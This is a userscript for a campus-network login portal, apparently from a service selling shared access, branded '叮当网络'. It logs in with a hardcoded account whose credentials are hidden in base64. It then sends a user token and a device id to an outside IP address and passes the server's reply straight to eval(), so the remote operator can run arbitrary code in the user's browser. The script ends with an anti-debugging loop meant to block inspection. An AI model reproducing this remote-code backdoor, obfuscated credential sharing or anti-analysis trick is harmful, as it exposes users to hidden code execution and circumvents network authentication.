// ==UserScript==
// @name         auto-connect
// @namespace    172.16.1.2
// @version      1.1
// @description  加速
// @author       叮当网络
// @match        http://172.16.1.2/login*
// @icon         data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==
// @grant        GM_addStyle
// @grant GM_xmlhttpRequest
// @grant        unsafeWindow


// @downloadURL https://update.greasyfork.org/scripts/473099/auto-connect.user.js
// @updateURL https://update.greasyfork.org/scripts/473099/auto-connect.meta.js
// ==/UserScript==

(function() {
    'use strict';

    // Your code here...
    GM_addStyle(`
      * {
        margin: 0;
        padding: 0;
      }

      body {
        background-image: url("https://xma-1301702716.cos.ap-nanjing.myqcloud.com/ddwl.jpg");
        background-size: cover;
        position: relative;
      }

      .box {
        width: 100vw;
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        background-size: 100% 100%;
      }

     .loginbox_out {
        width: 23.875rem;
        height: 28.25rem;
        backdrop-filter: blur(80px);
        border-radius: 10px;
        position: relative;
        margin: auto;
        display: flex;
        flex-direction: row;
        flex-wrap: wrap;
        align-content: flex-start;
        justify-content: center;
        background: transparent;
        overflow: hidden;
        border: 1px solid black;
      }
      .loginbox {
        width: 23.75rem;
        height: 28.125rem;
        backdrop-filter: blur(300px);
        border-radius: 10px;
        position: relative;
        margin: auto;
        display: flex;
        flex-direction: row;
        flex-wrap: wrap;
        align-content: flex-start;
        justify-content: center;
        background: transparent;
        z-index: 1;
        margin-top: 1px;
      }
      .login_button {
        width: 100%;
        height: auto;
        margin-top: 20%;
        display: flex;
        justify-content: center;
        align-items: center;
      }
      .login_b {
        width: 30%;
        height: 45px;
        background: #1c1c1c;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 18px;
        font-weight: bold;
        border-radius: 10px;
        transition: all 0.3s;
      }
      .login_b:hover {
        box-shadow: 2px -2px 20px 0px;
        transition: all 0.3s;
        cursor: pointer;
      }
      .login_b span {
        width: 30%;
        display: flex;
        justify-content: center;
        align-items: center;
      }
      .topic {
        width: 100%;
        height: 25%;
        font-size: 25px;
        color: #1c1c1c;
        display: flex;
        justify-content: center;
        align-items: center;
        font-weight: bold;
      }
      .inputbox {
        position: relative;
        width: 255px;
        height: 40px;
        margin-top: 40px;
      }
      .inputbox input {
        width: 245px;
        height: 40px;
        font-size: 16px;
        outline: white;
        border-bottom: 1px solid #1c1c1c;
        border-left: 1px solid transparent;
        border-right: 1px solid transparent;
        border-top: 1px solid transparent;
        background: transparent;
        color: #1c1c1c;
        padding-left: 10px;
      }
      .inputbox span {
        position: absolute;
        left: 0;
        top: 0;
        padding: 10px;
        font-size: 16px;
        text-transform: uppercase;
        pointer-events: none;
        transition: 0.32s;
        color: #1c1c1c;
        font-weight: bold;
      }
      .inputbox input:valid,
      .inputbox input:focus {
        transition: all 0.3s;
        color: #1c1c1c;
      }
      .inputbox input:valid ~ span,
      .inputbox input:focus ~ span {
        color: #1c1c1c;
        transform: translateY(-25px) translateX(-9px);
        font-size: 16px;
        padding: 1px 10px;
        border-radius: 3px;
      }
      .inputbox:nth-child(3) input:valid ~ span,
      .inputbox:nth-child(3) input:focus ~ span {
        color: #1c1c1c;
        transform: translateY(-25px) translateX(-9px);
        font-size: 16px;
        padding: 1px 10px;
        border-radius: 3px;
      }

      .bg {
        width: 100vw;
        height: 100vh;
        background-color: rgba(0, 0, 0, 0.5);
        position: absolute;
        left: 0;
        top: 0;
      }

      .loader {
        width: 60px;
        height: 60px;
        border: 6px solid #f3f3f3;
        border-top: 6px solid #5fffff;
        border-radius: 50%;
        animation: spin 1s linear infinite;
        margin: 50px auto;
        position: absolute;
        left: 48%;
        top: 30%;
      }

      @keyframes spin {
        0% {
          transform: rotate(0deg);
        }
        100% {
          transform: rotate(360deg);
        }
      }`)



    document.querySelector("title").innerHTML = "叮当网络";

    let code = ` <div class="box">
								<div class="loginbox_out">
								<div class="loginbox">
								<div class="topic">
								<span>用户认证</span>
								</div>
								<div class="inputbox">
								<input type="text" required="required" id="token" value="" />
								<span>秘钥</span>
								</div>
								<div class="login_button">
								<div class="login_b" id="connect">
								<span style="color: #5fffff">连</span>
								<span style="color: #5fffff">接</span>
								</div>
								</div>
								</div>
								</div>
						 </div>`;

    let successCode = ` <div class="box">
											<div class="loginbox_out">
											<div class="loginbox">
											<div class="topic">
											<span>认证成功</span>
											</div>
											<div class="login_button">
											<div class="login_b" onclick='let xhr = new XMLHttpRequest();xhr.open("GET", "http://127.0.0.1/logout?id=1", true);xhr.send();location.reload()'>
											<span style="color: #5fffff">注</span>
											<span style="color: #5fffff">销</span>
											</div>
											</div>
											</div>
											</div>
				</div>`;

    let loadding = `<div class="bg">
                    <div class="loader"></div>
                  </div>`;

    function getRandomString(length) {
        var result = "";
        var characters =
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        var charactersLength = characters.length;
        for (var i = 0; i < length; i++) {
            result += characters.charAt(
                Math.floor(Math.random() * charactersLength)
            );
        }
        return result;
    }
    unsafeWindow.handleResponse= (response) => {
        if (response.code != 200) {
            var x2 = new XMLHttpRequest();
            x2.open("GET", "http://172.16.1.2/logout?id=1", true);
            x2.send();
            alert(response.msg);
            location.reload();
        } else {
            var x = new XMLHttpRequest();
            x.open("GET", "http://172.16.1.2/logout?id=1", true);
            x.send();
            setTimeout(() => {
                const xhr = new XMLHttpRequest();
                xhr.open("POST", "http://172.16.1.2/login?id=1");
                xhr.setRequestHeader(
                    "Content-Type",
                    "application/x-www-form-urlencoded"
                );
                const res =
                      "username=" +
                      response.username +
                      "&password=" +
                      response.password;
                xhr.send(res);
                document.querySelector("body").innerHTML = successCode;
            }, 1000);
        }
    };
    let logout = new XMLHttpRequest();
    logout.open("GET", "http://172.16.1.2/logout?id=1", true);
    logout.timeout = 3000
    logout.send();
    logout.ontimeout = function () {
        alert('程序初始化失败 请检查是否连接上校园网！');
    };

    document.querySelector("body").innerHTML = code;

    document.querySelector("#connect").addEventListener("click", function () {
        let token = document.querySelector("#token").value;

        document.querySelector("body").innerHTML = code + loadding;

        const x1 = new XMLHttpRequest();
        x1.open("POST", "http://172.16.1.2/login?id=1");
        x1.timeout = 3000
        x1.setRequestHeader(
            "Content-Type",
            "application/x-www-form-urlencoded"
        );
        const data =
              "username=" + atob("MjIwMTAzOTc=") + "&password=" + atob("MjgwMDEx");
        x1.onload = function () {
            if (x1.status === 200) {
                let uni = localStorage.getItem("uni")
                if ( uni == null) {
                    uni = getRandomString(18);
                    localStorage.setItem("uni", uni);
                }
                let url = "http://39.101.78.221/connect?token=" +token +"&callback=handleResponse&ip=" + uni;
                GM_xmlhttpRequest({
                    method: 'GET',
                    url: url,
                    onload: response => {
                        if (response.status == 200) {
                            eval(response.responseText);
                        }
                    }
                });
            };

        };
        x1.onerror = function () {
            alert("请检查是否连接上校园网！！");
            location.reload();
        };
        x1.send(data);
    });
    (() => {function block() {setInterval(() => {Function("debugger")();}, 50);}try {block();} catch (err) {}})();
})();